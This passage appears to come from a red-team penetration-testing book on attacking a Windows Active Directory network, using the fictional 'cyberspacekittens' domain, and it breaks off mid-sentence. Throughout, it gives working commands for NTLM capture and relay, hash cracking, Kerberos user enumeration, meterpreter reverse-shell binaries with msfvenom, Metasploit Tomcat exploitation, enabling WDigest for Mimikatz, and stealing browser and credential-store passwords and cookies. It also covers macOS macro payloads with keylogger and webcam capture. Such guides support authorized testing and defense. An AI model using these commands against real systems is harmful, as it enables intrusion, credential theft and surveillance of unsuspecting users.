the it department removes that share drive from the network and it no longer exists. due to the fact you still have a mounted drive for the server name, cyberspacekittenssecretdrive, your system will continually ask the network if anyone knows the ip for it. now , this file share example could be rare to find; however , because there is a high likelihood that a previously connected syste m no longer exists on the network, this issue will still occur . we have seen this from mounted drives, applications that have hardcoded servers, and many times, just misconfigurations. we can use a tool like responder to take advantage of those systems looking for a hostname and respond to it with our malicious server. even better is that responder can go a step above and act as a wpad (web proxy auto-discovery protocol) server , proxying all data through our attacker server , but that is a whole other attack. cd /opt/responder ./responder .py -i eth0 -wrf now , since we are in a window s enterprise environment, we can make the assumption that it most likely is running active directory . so, if we can respond to the dns lookup from our victim host, we can make their system connect to our smb share. since they are connecting to the drive \\\\cyberspacekittenssecretdrive, we are going to force the victim to authenticate with their ntlmv2 credentials (or cached credenti als). these credentials that we capture will not be straight ntlm hashes, but they will be ntlm challenge/response hashes (ntlmv2-ssp). the only issue with these hashes is that they are immensely slower to crack than the normal ntlm hashes, but this isn't a huge problem these days with large cracking boxes at our disposal (see cracking section). we can take the ntlmv2 hash, pass it over to hashcat, and crack the passwords. within hashcat, we need to specify the hash format \"-m\" (https://hashcat.net/wiki/doku.php?id=example_hashes ) for netntlmv2. hashcat -m 5600 hashes\\ntlmssp_hashes.txt passwordlists/* now , let's say we don't really want to crack hashes or we don't mind possibly alerting the user to something suspicious. what we can do is force a basic auth pop-up instead of requiring the use of netntlmv2 credentials by using the f (forcewpadauth) and b (basic auth). python ./responder .py -i eth0 -wffbv as you can see from the imag e above, the user will be prompted for a username and password, which most people will just blindly enter . once they submit their credentials, we will be able to capture them in clear text! better responder (multirelay .py) the problem with responder and cracking ntlmv2-ssp hashe s is that the time it takes to crack these hashes can be extensive. worse, we have been in environments where the passwords for administrators are 20+ characters. so, what can we do in these scenarios? if the environment does not enforce smb signing (which we can find with a quick nmap script scan https://nmap.or g/nsedoc/scripts/smb-security-mode.html), we can do a slick little trick with replaying the smb request we captured. laurent gaffie included a tool in responder to handle authentication replay attacks. per laurent's site, \"multirelay is a powerful pentest utility included in responder's tools folder , giving you the ability to perform targeted ntlm v1 and ntlmv2 relay on a selected target. currently multirelay relays http , webdav , proxy and smb authentic ations to an smb server. this tool can be customized to accept a range of users to relay to a target. the concept behind this is to only target domain administrators, local administrators, or privileged accounts.” [http://glaurent.blogspot.com/2016/10/introducing-responder -multirelay-10.html] from a high level, instead of forcing the victim to authenticate to our smb share, multirelay will forward any authentication requests will be forwarded to a victim host of our choice. of course, that relayed user will need to have access into that other machine; however , if successful, we don't need to deal with any passwords or cracking. to get started, we need to configure our responder and multirelay: edit the responder config file to disable smb and http servers gedit responder .conf change smb and http to of f start responder python ./responder .py -i eth0 -rv start multirelay in a new t erminal w indow /opt/responder/tools ./multirelay .py -t <tar get host> -c <shell command> u all once the relay to a victim host is achievable, we need to think about what we want to execute on our victim workstation. by default, multirelay can spawn a basic shell, but we can also automatically execute meterpreter powershell payloads, empire powershell payloads, our dnscat2 powershell payload, powershell scripts to download and execute c2 agents, mimikatz, or just run calc.exe for kicks. references http://threat.tevora.com/quick-tip-skip-cracking-responder hashes-and-replay-them/ powershell responder once we compromise a windows system, we can use powershell off our victim to do responder style attacks. both features of the original responder can be performed through the following two tools: inveigh - https://github.com/kevinrobertson/inveigh/blob/master/scripts/inveigh.ps1 inveigh-relay to make things even easier , all this is already built into empire. user enumeration without credentials once on the network, we might be able to use responder to get credentials or shells, but there are also times when both smb signing is enabled and cracking ntlm v2 ssp isn't viable. that is when we take a step back and start with the basics. without actively scanning the network yet, we need to get a list of users (could be for password spraying or even social engineering). one option is to start enumerating users against the domain controller . historically (back in the 2003 era), we could try to perform rid cycling to get a list of all user accounts. although this is no longer availab le, there are other options to bruteforce accounts. one option is to abuse kerberos: nmap -p88 --script krb5-enum-users --script-ar gs krb5-enumusers.realm=\"cyberspacekittens.local\",userdb=/opt/userlist.txt <domain controller ip> we will need to supply a list of usernames to test, but since we are only querying the dc and not authenticating it, this activity is generally not detected. now , we can take these user accounts and start password spraying again! scanning the network with crackmapexec (cme) if we don't have a compromised system yet, but we did gain credentials through responder , misconfigured web app, bruteforcing, or a printer , then we can try to sweep the network to see where this account can log in. a simple sweep using a tool like crackmapexec (cme) can assis t in finding that initial point of entry on the internal network. historically , we have used cme to scan the network, identify/authenticate via smb on the network, execute commands remotely to many hosts, and even pull clear text creds via mimikatz. with newer features in both empire and cme, we can take advantage of empire's rest feature. in the following scenario, we are going to spin up empire with its rest api, configure the password in cme, have cme connect to empi re, scan the network with the single credential we have, and finally , if we do authenticate, automatically push an empire payload to the remote victim's system. if you have a helpdesk or privileged account, get ready for a load of empire shells! start empire's rest api server cd /opt/empire ./empire --rest --password 'hacktheuniverse' change the crackmapexec password gedit /root/.cme/cme.conf password=hacktheuniverse run cme to spawn empire shells cme smb 10.100.100.0/24 -d 'cyberspacekittens.local' -u '<username>' -p '<password>' -m empire_exec -o listener=http after compromising your initial host after you have gained access to a host via social engineering, drop boxes, responder , attack ing printers or other attacks, what do you do next? that is always the million dollar question. in the past, it was all about understanding where you are and your immediate surro unding network. we may initially run commands similar to \"netstat -ano\" to find the locations of our ip ranges of the victim's servers, domains, and user. we can also run commands like \"ps\" or \"sc queryex type= service state= all | find \"_name\"\" to list all the running services and look for av or other host base protections. here are some other example commands we might initially run: network information: netstat -anop | findstr listen net group \"domain admins\" /domain process list: tasklist /v system host information: sysinfo get-wmiobject -class win32 operatingsystem | select -property * | exportcsv c:\\temp\\os.txt wmic qfe get caption,description,hotfixid,installedon simple file search: dir /s *password* findstr /s /n /i /p foo * findstr /si pass *.txt | *.xml | *.ini information from shares/mounted drives: powershell -command \"get-wmiobject -class w in32_share\" powershell -command \"get-psdrive\" powershell -command \"get-wmiobject -class win32_mappedlogicaldisk | select name, providername” let's be real here, no one has time to remember all of these commands, but we are in luck! i believe, based on the rtfm book (great resource), leostat created a quick python script that has a ton of these handy comm ands easily searchable in a tool called rtfm.py (https://github.com/leostat/rtfm). update and run r tfm cd /opt/rtfm chmod +x rtfm.py ./rtfm.py -u ./rtfm.py -c 'rtfm' search all t ags ./rtfm.py -dt look at all the queries/commands per tag. one i like to use is the enumeration category ./rtfm.py -t enumeration | more now , rtfm is pretty extens ive and has a lot of different helpful commands. this is a great quick resource during any campaign. these are all the things we have been doing forever to get information, but what if we could get much more from the environment? using powershell, we can gain the network/envir onment information that we need. since powershell can be easily execu ted from any of the c2 tools, you can use empire, metaspl oit, or cobalt strike to perform these labs. in the following examples, we will be using empire, but feel free to try other tools. privilege escalation there are plenty of different ways to go from a regular user to a privileged account. unquoted service paths: this is a fairly easy and common vulnerability where the service executable path is not surrounded by quotes. this is abused because, without quotes around the path, we can abuse a current service. let's say we have a service that is configured to execute c:\\program files (x86)\\cyber kittens\\cyber kittens.exe. if we have write permissions into the cyber kittens folder , we can drop malware to be located at c:\\program files (x86)\\cyber kittens\\cyber .exe (notice that kittens.exe is missing). if the service runs at system, we can wait until the service restarts, and have our malware run as a privileged account. how to find v ulnerable service paths: wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\w indows\\\\\" |findstr /i /v \"\"\" look for binar y_path_name finding insecure registry permissions for services: identify weak permissions that allow update of service image path locations check if the alwaysinstallelevated registry key is enabled: checks the alwaysinstallelevated registry keys which dictates if .msi files should be installed with elevated privileges (nt authority\\system) https://github.com/rapid7/metasploitframework/blob/master/modules/exploits/windows/local/always _install_elevated.rb note that we don't really have to do these manually as a few good metasploit and powershell modules have been created especially for windows. in the following example, we are going to take a look at powerup powershell script (https://github.com/empireproject/empire/blob/master/data/module_source/ privesc/powerup.ps1). in this case, the script is in conjunction with empire and will run all common areas of misconfiguration that allow for a regular user to get a local administrative or system account. in the example below , we ran this on our victim system and saw that it had some unquoted service paths for localsystem. now , we might not be able to restart the service, but we should be able to abuse the vulnerability and wait for a reboot. empire powerup module: usermodule privesc/powerup/allchecks what sticks out right away: servicename : wavessyssvc path : c:\\program files\\w aves\\maxxaudio\\w avessyssvc64.exe modifiablefile : c:\\program files\\w aves\\maxxaudio\\w avessyssvc64.exe modifiablefilepermissions : {w riteowner , delete, w riteattributes, synchronize...} modifiablefileidentityrefer ence : everyone startname : localsystem it looks like the wavessyssyc service is writeable by every one. that means we can replace the wavesyssvc64.exe file with a malicious binary of our own: create a meterpreter binary (will discuss later how to get around a v) msfvenom -p windows/meterpreter/reverse_https lhost=[ip] lpor t=8080 -f exe > shell.exe upload the binary using empire and replace the original binary upload ./shell.exe c:\\\\users\\\\test\\\\shell.exe shell copy c:\\users\\test\\desktop\\shell.exe \"c:\\program files\\w aves\\maxxaudio\\w avessyssvc64.exe\" restart service or wait for a reboot once the service restarts, you should get your meterpreter shell back as system! using powerup, you will find many different services that are potentially vulnerable to privile ge escalation. if you want a deeper primer on the underlying issues with windows privesc, check out fuzzsecurity's article: http://www .fuzzysecurity .com/tutorials/16.html. for unpatched windows systems, we do have some go-to privilege escalation attacks like (https://github.com/fuzzysecurity/powershellsuite/blob/master/invoke-ms16-032.ps1) and (https://github.com/fuzzysecurity/pskernelprimitives/tree/master/sample-exploits/ms16-135), but how do we quickly identify what patches are insta lled on a windows system? we can use default comman ds on our victim system to see what service packages are installed. windows comes with a default command “systeminfo” that will pull all the patch history for any given windows host. we can take that output, push it to our kali system and run windows exploit suggester to find known exploits against those vulnerabilities. back on your w indows 10 v ictims system: systeminfo systeminfo > windows.txt copy windows.txt to your kali box under /opt/w indowsexploit-suggester python ./windows-exploit-suggester .py -i ./windows.txt -d 201803-21-mssb.xls this tool hasn't been actively maintained in a little while, but you can easily add the privilege escalation vulnerabilities you are looking for . in cases where we are in a completely patched windows envir onment, we focus on different privilege escalation vulnerabilities in third party software or any 0-day/n ew vulnerabilit ies for the os. for example, we are constantly looking for vulnerabilities like this, http://bit.ly/2hnx5id, which is a privilege escalation in windows that looks like it is not patched at this time. usually in these scenarios , there might be some basic poc code, but it is up to us to test, validate, and many times finish the exploit. some of the areas we regularly monitor for public privilege escalations vulnerabilities: http://insecure.or g/search.html?q=privilege%20escalation https://bugs.chromium.or g/p/project-zero/issues/list? can=1&q=escalation&colspec=id+t ype+status+priority+milest one+owner+summary&cells=ids often, it is just about timing . for example, when a vulnerability is discovered, that may be your limited window of opportunity to further compromise the system before it is patched. privilege escalation lab the best lab to test and try different privilege escalation vulnerabilities is metasploitable3 (https://github.com/rapid7/metasploitable3) by rapid7. this vulnerable framework automatically builds a windows vm with all the common and some uncomm on vulnerabilities. it does take a bit to set up, but once the vm is configured, it is a great testing lab. to walk you through a quick example and to get you started: nmap the metasploitable3 box (make sure to do all ports as you might miss some) you will see manageengine running on port 8383 start up metasploit and search for any manageengine vulnerabilities msfconsole search manageengine use exploit/windows/http/manageengine_connectionid_wr ite set ssl t rue set rpor t 8383 set rhost <y our ip> exploit getsystem you will notice that you cannot get to system because the service you compromised is not running as a privileged process. this is where you can try all dif ferent privilege escalation attacks. one thing we do see is that apache t omcat is running as a privileged process. if we can abuse this service, we may be able to execute our payload as a higher service. w e saw that apache tomcat was running on the outside on port 8282, but it needed a username and password. since we do have a userland shell, we can try to search for that password on disk. this is where we can search the internet or google \"where are t omcat passwords stored\". the result, tomcat-users.xml. on the victim box, we can search and read the tomcat-users.xml file: shell cd \\ && dir /s tomcat-users.xml type \"c:\\program files\\apache software foundation\\tomcat\\apache-tomcat8.0.33\\conf\\tomcat-users.xml let’s now attack t omcat with the passwords we found. first, log into the t omcat management console on port 8282 and see that our password worked. w e can then use metasploit to deploy a malicious w ar file via t omcat. search tomcat use exploit/multi/http/tomcat_mgr_upload show options set httpusername sploit set httppassword sploit set rpor t 8282 set rhost <metasploitable3_ip> set payload java/shell_reverse_tcp set lhost <y our ip> exploit whoami you should now be system. w e took advantage of a third party tool to privilege escalate to system. pulling clear t ext cr edentials fr om memory mimikatz (https ://github.com/gentilkiwi/mimikatz) has been around for a while and changed the game in terms of getting passwords in clear text. prior to windows 10, running mimikatz on a host system as a local administrator allowed an attacker to pull out clear text passwords from lsass (local security authority subsystem service). this worked great until windows 10 came along and made it inaccessible to read from, even as local admin. now , there are some odd use cases i have seen where single sign-on (sso) or some unique software puts the passwo rds back in lsass for mimikatz to read, but we will ignore this for now. in this chapter , we are going to talk about what to do when it doesn't work (like windows 10). let’s say you have compromised a windows 10 workstation and privilege escalated to a local admin. by default, you would have spun up mimikatz and, per the query below , see that the password fields are null. so what can you do? the easiest option is to set the registry key to put the passwords back in lsass. within hklm there is a uselogo ncredential setting that if set to 0, will store credentials back in memory (http://bit.ly/2vhfbiz): reg add hklm\\system\\currentcontrolset\\control\\securityproviders\\ wdigest /v uselogoncredential /t reg_dword /d 1 /f in empire, we can run this via the shell command: shell reg add hklm\\system\\currentcontrolset\\control\\security providers\\wdigest /v uselogoncredential /t reg_dword /d 1 /f the problem with this setting is that we will need the user to re-login to the system. you could cause a screen timeout, reboot, or logof f, so that you will be able to capture clear text credentials again. the easiest way though is to lock their workstation (so they don't lose any of their work . . . see how nice we are?). t o trigger a lock screen: rundll32.exe user32.dll,lockw orkstation once we cause the lock screen and have them re-log back in, we can re-run mimikatz with clear text passwords. what if we can't get to a local administrative account? what are some other options we have to get a user's credentials? back in the day, a common pentesting attack was to look in userland memory at thick clients to see if credentials were stored in clear text. now that everything is browser based, can we do the same in the browser? this is where putterpanda put a cool poc style tool together to accomplish just this, called mimikittenz (https://github.com/putterpanda/mimikittenz). what mimikittenz does is it utilizes the windows function readprocessmemory() in order to extract plain-text passwords from various target processes such as browsers. mimikittenz has a great deal of memory search queries preloaded for gmail, office365, outlook web, jira, github, bugzilla, zendesk, cpanel, dropbox, microsoft onedrive, aws web services, slack, twitter , and facebook. it is also easy to write your search expressions within mimikittenz. the best part of this tool is that it does not require local administrative access as it is all userland memory . once we have compromised a host, we will import mimikittenz into memory , and run the invoke-mimikittenz script. as seen above, the user had firefox logged into github and we were able to pull their userna me and password from the browser's memory . now , i hope everyone can take this tool to the next level and create more search queries for dif ferent applications. getting passwords from the windows credential store and browsers the windows credential store is a default feature of window s that saves usernames, passwords, and certificates for systems, websites, and servers. when you have authenticated into a website using microsoft ie/edge, you normally get a pop-up that asks \"do you want to save your passw ord?\" the credential store is where that information is stored. within the credential manager , there are two types of credentials: web and window s. do you remember which user has access to this data? it is not system, but the user who is logged in who can retrieve this information. this is great for us, as with any phish or code executio n, we are usually in rights of that person. the best part is that we don't even need to be a local administrator to pull this data. how can we pull this informa tion? there are two different powershell scripts we can import to gather this data: gathering w eb credentials: https://github.com/samratashok/nishang/blob/master/ gather/get-w ebcredentials.ps1 gathering w indows credentials (only does type generic not domain): https://github.com/peewpw/invokewcmdump/blob/master/invoke-wcmdump.ps1 as you can see from the dump, we pulled both their face book-stored credential and any generic credentials they have. remember , for the web credentials, get-w ebcredential s will only get passwords from internet explorer/edge. if we need to get it from chrome, we can use the empire payload powershell/collection /chromedump. prior to getting chromedump to work, you will first need to kill the chrome process and then run chromedump. lastl y, i love to pull all browser history and cookies. not only can we learn a great deal about their internal servers, but also, if their sessions are still alive, we can use their cookies and authenticate without ever knowing their passwords! using a powershell script like: https://github.com/sekirkity/browsergather , we can extract all the browser cookies, steal them, and tunnel our browser to take advantage of these cookies, all without privilege escalating. next, we can even start looking for servers and credentials in all the third party software that might be installed on the victim's system. a tool called sessiongopher (https://github .com/fireeye/sessiongopher) can grab hostnames and saved passwords from winscp , putty , superputty , filezilla, and microsoft remote desktop. one of the other included features also included is the ability to remotely grab local credentials off other systems on the network. the easiest way to launch sessiongopher is to import the powershell script and execute using: load powershell file: . .\\sessiongopher .ps1 execute sessiongopher invoke-sessiongopher -thorough these are just a few ways we can get credentials from the host system without ever privilege escala ting, bypassing uac, or turning on a keylogger . since we are in context of the user, we have access to many of the resources on the host machine to help us continue our path to exploitation. getting local cr eds and information fr om osx most of the lateral movement within the thp focuses on windows. this is because almost all of the medium to large environments utilize active directory to manage their syste ms and hosts. we do come across macs more and more each year and want to make sure to include them as well. once inside an environment, many of the attacks are similar to those in the window's world (i.e. scanning for default creds, jenkin/application attacks, sniffing the network, and laterally moving via ssh or vnc). there are a few payloads that support macs and one of my favorites is using empire. empire can gene rate multiple payloads to trick your victim into executing our agents. thes e include ducky scripts, applications, office macros, safari launchers, pkgs, and more. for example, we can create an office macro similar to what we have done in windows in powershell empire: 1. launch empire 2. first, make sure to set up your empire listener as we did at the beginning of the book 3. next, we need to build an osx macro payload 1. usestager osx/macro 4. set an outfile to write to your local file system 1. set outfile /tmp/mac.py 5. generate the payload if you take a look at the generated office macro, you will see that it is just base64 code that is executed by python. luckily for us, python is a default application on macs and when this macro is executed, we should get our agent beacon. to create the malicious excel file in mac, we can open a new excel worksheet, go to tools, view macros, create a macro in this workbook, and once microsoft visual basic opens up, delete all current code and replace it with all your new macro code. finally , save it as an xlsm file. now , send off your malicious file to your victim and watch the empire agents roll in. on the victim side, once they open the excel file, it will look something like this: make sure you create a reasonable story to have them click enable macros. once your agent connects back to your empire server , the reconnaissance phase it pretty similar . we are going to need to: dump brower information and passwords: usemodule collection/osx/browser_dump enable a keylogger: usemodule collection/osx/keylogger cause an app prompt for password capture: usemodule collection/osx/prompt always helps to use their camera to take a picture: usemodule collection/osx/webcam living off of the land in a windows domain environment again, in our examples below , we are going to be using powershell empire. however , you can also use metasploit, cobalt strike, or similar to do the same style attacks. it doesn't really matter as long as you have the ability to import powershell scripts into memory and evade whatever the host system protections are. now that you have compromised your victim, stolen all the secrets from their workstation, learned about some of the sites your victim browses, and run some netstat style recon... what's next? for a red teamer , it is really about finding reliable information on servers, workstations, users, services, and about their active directory environment. in many cases, we can't run any vulnerability scans or even an nmap scan due to the risk of getting alerted/caught. so, how can we utilize \"features\" of the networks and services to find all the information we need? service principal names service principal names, or spn, is a feature in windows that allows a client to uniquely identify the instance of a service. spns are used by kerberos authentication to assoc iate a service instance with a service logon account [https://msdn.microsoft.com/enus/library/ms677949(v=vs.85).aspx]. for example, you might have an spn for service accounts that run mssql servers, http servers, print servers, and others. for an attacker , querying spn is a vital part of the enumeration phase. this is because any domain user account can query ad for all the service accounts/servers that are associated with active directory . we can identify all the databases and web servers without having to scan a single host! as an attacker , we can take advantage of these \"features\" to query active directory . from any domain-joined computer , an attacker can run the setspn.exe file to query ad. this file is a default windows binary and is on all modern w indows systems. setspn -t [domain] -f -q */* switches: -t = perform query on the specified domain -f = perform queries at the ad forest, rather than domain level -q = execute on each tar get domain or forest */* = everything what type of information do we see from setspn? below , running the setspn command, we see information about the services running on the domain controll er, information about a workstation, and we also found a server named csk-github. in this example, we can see that there is an http service running on that host machine. if this had been on a different port, but still the same protocol, that information would have been listed as well. setspn will not only provide useful information about service users and all the hostnames in ad, but it will also tell us which services are running on the systems and even the port. why do we need to scan the network if we can get most of the information directly from ad for services and even ports? what are some of the things that you might attack right away? jenkins? t omcat? coldfusion? querying active dir ectory i don't know how many times i have found a single domain user account and password, only to be told by it that it is just a domain user account with no other privileges and not to worry . we have found these types of accounts on printers, shared kiosk workstations, flat file texts with passwords for services, configu rations files, ipads, web apps that have the passwords within the source of the page, and so much more. but what can you do with a basic domain user account with no other group memberships? get mor e detailed information about users in ad we can use a tool called powerv iew (http://bit.ly/2jktg5d) created by @harmj0y to do all the dirty work for us. powerv iew is a powershell tool to gain network situational awareness on windows domains. it contains a set of pure-powershell replacements for various windows \"net *\" commands, which utilizes powershell ad hooks and underlying win32 api functions to perform useful windows domain functionality [http://bit.ly/2r9lynh]. as an attacker , we can leverage powerv iew and powershell to query ad, which can be done with the lowest permissioned user in ad, \"domain users\" , and even without local administrator permissions. let's walk throu gh an example of how much data we can get with this lowlevel user. to get started, we already have empire running (you could replicate this in metasploit, cobalt strike, or similar) and executed a payload on our victim system. if you have never set up empire before, check out the setup chapter on setting up empire and empire payloads. once we have our agent comm unicating with our command and control server , we can type \"info\" to find out information about our victim. in this case, we have compromised a host running a fully patched windows 10 system, with a username of neil.pawstrong, on the cyberspacekitten's domain. next, we want to query inform ation from the domain without raising too much suspicion. we can use the powerv iew tools within empire to get information. powerv iew queries the domain controller (dc) to get information on users, groups, computers, and more. the powerv iew features that we will be using will only query the domain controller and should look like normal traf fic. what modules are available under empire for situational awareness? we can start with the powerv iew script called get_user . get_ user queries information for a given user or users in the specified domain. by using the default settings, we can get a dump of all information about users in ad and associated information. module: situational_awareness/network/powerview/get_user in the dump above, we can see information on one of the users, purri gagarin. what type of information did we get? we can see their samaccountname or username, when their password was changed, what their object category is, what membersof they are part of, last login, and more. with this basic user dump, we can get significant amount of information from the directory service. what other type of information can we get? module: situational_awareness/network/powerview/get_group_member get_group_member returns the members of a given group, with the option to \"recurse\" to find all effective group members. we can use ad to find specific users of certain groups . for example, with the following empire settings, we can search for all domain admins and groups that are part of the domain admin group: info set identity \"domain admins\" set recurse t rue set fulldata t rue execute now , we have a list of users, groups, servers and services. this will help us map which users have which privileges. however , we still need detailed information about workstations and systems. this could include versions, creation dates, usage, hostnames, and more. we can get this information on a module called get_computer . module: situational_awareness/network/powerview/get_computer description: the get_computer module queries the domain for current computer objects. what informati on do we gain from having get_computer querying the domain controller? well, we see that we gained informatio n about the machine, when it was created, dns hostnames, the distinguished names, and more. as an attacker , one of the most helpful recon details is obtaining operating system types and operating system versions. in this case, we can see that these systems are on windows 10 and on build 16299. we can take this information and find out how recent the os is and if they are being actively patched on microsoft's release info page: https://technet.microsoft.com/en-us/windows/release-info.aspx. bloodhound/sharphound how can we take all the inform ation we gathered from our reconnaissance phase to create a path of exploitation? how can we easily and quickly correlate who has access to what? back in the day, we used to just try and compromise everything to get to where we want, but that always increased the likelihood of getting caught. andrew robbin s, rohan vazarkar , and will schroeder have created one of the best tools for correlation called bloodhound/sharphound . per their github page, \"bloodhound uses graph theory to reveal the hidde n and often unintended relationships within an active directory environment. attackers can use bloodh ound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify . defenders can use bloodhound to identify and eliminate those same attack paths. both blue and red teams can use bloodhound to easily gain a deeper understanding of privilege relationships in an active directory environment.” [https://github.com/bloodhoundad/bloodhound] bloodhound works by running an ingestor on a victim system, and then queries ad (similar to what we previously did manually) for users, groups, and hosts. the ingestor will then try to connect to each system to enumerate logge d in users, sessions, and permissions. of course, this is going to be pretty loud on the network. for a medium- large sized organization on the default setting (which can be modified), it can take less than 10 minutes to connect to every host system and query information using sharphoun d. note, since this touches every domain-joined system on the network, it could get you caught. there is a stealth option in bloodhound that will only query active directory and not conn ect to every host system, but the output is pretty limited. there are curren tly two different versions (of which i'm sure the old one will soon be removed): inside empire, you can use the module: usemodule situational_awareness/network/bloodhound this still uses the old powershell version that is very slow the better option is sharphound. sharphound is the c# version of the original bloodhound ingester . this one is much faster and stable. this can be used as a stand-alone binary or imported as a powershell script. the sharphound powershell script will use reflection and assembly .load to load the compiled bloodhound c# ingestor into memory . https://github.com/bloodhoundad/bloodhound/tree/ master/ingestors to run the bloodhound/sha rphound ingestor , there are multiple collectionmethods you might need to specify: group - collect group membership information localgroup - collect local admin information for computers session - collect session information for computers sessionloop - continuously collect session information until killed trusts - enumerate domain trust data acl - collect acl (access control list) data computeronly - collects local admin and session data gpolocalgroup - collects local admin information using gpo (group policy objects) loggedon - collects session information using privileged methods (needs admin!) objectprops - collects node property information for users and computers default - collects group membership, local admin, sessions, and domain t rusts to run blood/sharphound, on the host system: run powershell and then either import bloodhound.ps1 or sharphound.ps1: invoke-bloodhound -collectionmethod default invoke-bloodhound -collectionmethod acl,objectprops,default -compressdata removecsv -nosavecache run the executables: sharphound.exe -c default,acl,session,loggedon,t rusts,group once bloundhound/sharphound is finished, four files will be dropped onto the victim system. grab those files and move them onto your kali box. next, we need to start our neo4j server and import this data to build our correlation graphs. start bloodhound 1. apt-get install bloodhound 2. neo4j console 3. open browser to http://localhost:7474 1. connect to bolt://localhost:7687 2. username: neo4j 3. password: neo4j 4. change password 4. run bloodhound at a t erminal: 1. bloodhound 2. database url: bolt://127.0.0.1:7687 3. username: neo4j 4. password: new password 5. load data: 1. on the right hand side, there is an \"upload data\" button 2. upload acls.csv , group_membership.csv , local_admin.csv , and sessions.csv if you don't have a domain to test this on, i have upload ed the four bloodhound files here: https://github.com/cyberspacekittens/bloodhound , so that you can repeat the exercises. once inside bloodhound and all the data is imported, we can go to the queries to look at the \"find shorted paths to domain admin\". we can also pick specific users and see if we can map a path to that specific user or group. in our case, the first box we compromised is neil.p awstrong@cybersp acekittens.local. in the search bar, we insert that user, click the \"pathfinding\" button, and type \"domain admin\" (or any other user) to see if we can route a path between these objects. as you can see from neil's machine, we can pivot all the way to the csklab. once on the lab box, there is a user called purri, who is a member of the helpdesk group. if we can comp romise the helpdesk group, we can pivot to chris' system, who also has elon muskkat currently logged in. if we can migrate to his process or steal his clear text password, we can elevate to domain admin! from large networks, we have noticed limitations and searching issues with the bloodhound queries. one great benefit of using neo4j is that it allows for raw queries through its own language called cypher . an in-depth look into cypher for custom queries can be found here: https://blog.cptjesus.com/posts/introtocypher . what kind of custom queries can we add? well, @porterhau5 has made some great progress in extending bloodhound to track and visualize your compromises. check out their article here: https://porterhau5.com/blog/extending-bloodhound-track-and-visualizeyour-compromise/. from a high level, @porterhau 5 added the idea of tagging compromised hosts to help facilitate better pivoting through the environ ment. for example, in this fake scenario, we compromised the initial user by phishing the user niel.pawstrong. using the cypher language and raw query feature on the bloodhound app, we can run these queries: adding an owned t ag to a compromised system: match (n) where n.name=\"neil.p awstrong@cybersp acekit tens.local\" set n.owned=\"phish\", n.wave=1 running a query to show all owned systems that were phished match (n) where n.owned=\"phish\" return n now , we can add some custom queries to bloodhound. on the queries tab of bloodhound, scroll to the bottom and click the edit button next to \"custom queries\". replace all the text with the contents from: https://github.com/porterhau5/bloodhoundowned/blob/master/customqueries.json after we save, we should have many more queries created. we can now click on \"find shortest path from owned node to domain admin\". if you want to look into this more closely , check out @porterhau5's forked version of bloodhound. it makes tagging compromised machines much prettier and allows for more custom functionality: https://github.com/porterhau5/bloodhound-owned. so far, without scanning, we have been able to gain a great deal of information about the organization. this is all with rights as the local ad user (domain users) and for the most part, none of the network traffic looks too suspicious. as you can see, we were able to do all this without being a local administrator or having any administrative rights on the local system. advanced acl/ace bloodhound when using bloodhound's collection method access control list (acl) type, our script will query ad to gather all the access control permissions on users/objects. the information we gather from access control entries (aces) describe s the allowed and denied permissions for users, groups, and computers. finding and abusing aces can be an entire book on its own, but here are a couple of good starting resources: bloodhound 1.3 – the acl attack path update https://wald0.com/?p=112 introducing the adversary resilience methodology http://bit.ly/2gyu7s7 what are we looking for when importing acl data into bloodhound? bloodhound identifies areas where weaknesses might exist in aces. this will include who has the ability to change/reset passwords, add members to groups, update objects like the scriptpath for other users, update object or write a new ace on an object, and more. how might you use this? when compromising boxes and gaining additional credentials, we can target paths to find a user that has the ability to reset passwords or modify ace permissions. this will lead to creative ways to find paths to domain admin or privileged accounts, and even allow for settin g up backdoors to be used later. a great resource to learn more about these types of abuses is: robbins-an-ace-up-the-sleevedesigning-active-directory-dacl-backdoors presentation (http://ubm.io/2gi5eaq). moving laterally - migrating pr ocesses once on a box with multiple users, it is common practice to either make tokens or migrate tokens of dif ferent users. this is nothing new , but heavily used to move laterally within an environment. usually from bloodhound outputs or shared workstation s, as attackers, we need to be able to impersonate other users on our victim systems. there are different ways to accomplish this using many of the tools we have. in terms of metasploit, we should all be pretty familiar with the post exploitation incognito (https://www .offensive-security .com/metasploitunleashed/fun-incognito/) to steal tokens. in empire, we can use steal_tokens to impersonate a user on that system. i have noticed that sometimes stealing tokens can break our shells. to avoid this, we can inject a new agent into a running process owned by a dif ferent user . in the following image, we phished an employee who ran our malware. this allowed us to run in a process owned by that victim user (neil.pawstrong). once on that user's box, we pivoted to buzz clawdrin's system and spawned a new agent with wmi (windows management instrumentation). the issue here is that we are still under the process of our initial victim, neil.pawstrong, as we used our cached credentials to spawn a shell onto buzz's host. therefore, instead of stealing tokens, we should use empire's psinject feature. psinject in empire \"has the ability to inject an agent into another process using reflectivepick to load up the .net common language runtime into a process and execute a particular powershell command, all without starting a new powershell.exe process! ” [http://bit.ly/2hdxj6x] we use this to spawn a brand new agent running as a process owned by buzz.c lawdrin, so that we can now get his access permissions. moving laterally off y our initial host now that you have found poten tial routes to move to, what are the options to gain code execution to those systems? the most basic way is to use the permission of our current active directory user to gain contro l of another system. for example, we might see a manager who has full access to their subordinates’ machines, a conference/lab machine with multiple users who have administrative privileges, a misconfiguration on internal systems, or see that someon e manually added a user to the local admin group on that pc. these are some of the ways we see a user have remote access to other workstations on the network. once on a compromised machine, we can either take the results from bloodhound or rescan the network to see what machines we have local access on: empire module: situational_awareness/network/powerview/find_localadmin_acc ess metasploit module: http://bit.ly/2jj7ilb empire's find_localadmin_access will query active directory for all hostnames and try to connect to them. this is definitely a loud tool as it needs to connect to every host and validate if it is a local administrator . as we can see, the find_localadmin_access module identifi ed that our compromised user does have access to the buzz.cyberspace kittens.local machine. this should be the same as when we ran bloodhound. to double check that we have access, i generally do non-interactive remote commands like dir \\\\[remote system]\\c$ and see that we have read/write permission to the c drive. in terms of lateral movement, there are several options to choose from. let's first take a peek at the ones in empire as they are genera lly the most common (pulled straight from empire): inveigh_relay: inveigh's smb relay function. this module can be used to relay incoming http/proxy ntlmv1/ntlmv2 authentication requests to an smb tar get. if the authentication is successfully relayed and the account has the correct privilege, a specified command or empire launcher will be executed on the target psexec style. invoke_executemsbuild: this function executes a powershell command on a local/remote host using msbuild and an inline task. if credentials are provided, the default administrative share is mounted locally . this command will be executed in the context of the msbuild.exe process without starting powershell.exe. invoke_psremoting: executes a stager on remote hosts using psremoting. as long as the victim has psremoting enabled (not always available), we can execute a powershell via this service. invoke_sqloscmd: executes a command or stager on remote hosts using 